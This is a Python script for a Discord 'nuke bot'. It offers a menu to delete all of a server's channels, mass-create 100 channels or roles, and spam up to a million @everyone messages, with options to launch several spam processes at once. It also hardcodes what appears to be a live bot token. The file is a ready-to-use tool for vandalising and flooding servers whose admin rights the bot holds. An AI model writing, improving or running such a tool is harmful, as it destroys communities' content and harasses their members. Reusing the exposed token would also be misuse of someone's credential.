import pip
import time
import random
a = "discord"
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])


if __name__ == '__main__':
   
    install(a)

import discord
from discord.ext import commands






import os
os.system("cls")
TOKEN = "MTIwMjYwMjkxNjc2NzMzODUyOA.GUOiW8.o5hlnup_J6LwxRQm4xcuvdXPWhpwxZXKp4oW2E"

menu = '''

██████╗░░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██║░░██║██║░░╚═╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║░░██║██║░░██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██████╔╝╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░

[1]: Delete channels
[2]: Channel maker
[3]: Role maker
[4]. Everyone spammer (1 million everyone)
'''
print(menu)
aa = input("[]: ")

#channel maker
if aa == "1":
    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]  
        if guild.me.guild_permissions.administrator:
            for channel in guild.channels:
                await channel.delete()
            print("All channels have been nuked! 💥")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to nuke the server.")
    bot.run(TOKEN)




if aa == "2":
    cname = input("Name of the channels: ")
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]  
        if guild.me.guild_permissions.administrator:  
            for i in range(100):
                await guild.create_text_channel(cname)
            print("100 channels have been created! 🎉")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to create channels.")
    bot.run(TOKEN)



if aa == "3":
    rname = input("Spam roles name: ")
    intents = discord.Intents.default()
    intents.guilds = True  
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0] 
        if guild.me.guild_permissions.administrator:
            for i in range(100): 
                await guild.create_role(name=rname, color=discord.Color.default())
            print("A new role has been created! 🎉")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to create roles.")
    bot.run(TOKEN)

if aa == "4":
    print("")
    print("choose how fast do you want to execute the 1 million everyone ")
    print("[1]: slow")
    print("[2]: medium")
    print("[3]: fast")
    print("[4]: really fast")
    print("[5]: deadly fast")
    
    f = input("[]: ")

    if f == "1":
        pass
    if f == "2":
        os.startfile("everyonespam.py")
        pass

    if f == "3":
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        pass

    if f == "4":
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        pass

    if f == "5":
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        os.startfile("everyonespam.py")
        pass

    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]
        if guild.me.guild_permissions.administrator:
            count = 0
            while (count < 1000000):
                count = count + 1
                channels = guild.text_channels
                random_channel = random.choice(channels)
                await random_channel.send("@everyone")
                print("Everyone spam sent!")
        else:
            print("The bot does not have administrator permissions to send messages.")

# Run the bot
    bot.run(TOKEN)